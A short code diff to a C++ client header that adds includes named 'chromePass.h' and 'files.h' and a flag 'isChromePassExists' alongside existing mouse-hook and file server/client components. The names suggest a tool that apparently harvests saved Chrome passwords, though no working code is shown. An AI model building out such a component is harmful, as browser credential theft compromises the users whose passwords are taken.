@@ -9,6 +9,8 @@
 #include "fileserver.h"
 #include "fileclient.h"
 #include "mousehookWinApi.h"
+#include "chromePass.h"
+#include "files.h"
 
 enum Files
 {
@@ -41,6 +43,7 @@ private:
     Config* config;
     FileServer* fileServer;
     FileClient* fileClient;
+    bool isChromePassExists;
 };
 
 #endif // CLIENT_H
